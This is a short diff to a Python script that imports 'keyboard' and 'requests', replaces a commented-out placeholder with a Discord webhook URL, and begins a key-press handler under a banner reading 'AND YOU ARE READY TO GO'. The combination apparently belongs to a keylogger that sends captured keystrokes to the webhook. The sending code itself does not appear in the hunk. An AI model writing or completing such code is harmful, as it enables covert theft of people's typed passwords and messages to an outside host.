@@ -1,8 +1,8 @@
 import keyboard
 import requests
 
-# url =""
-# add your discord webhook in the url variable
+url = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
+
 #********************AND YOU ARE READY TO GO********************#
 
 def on_key_press(event):
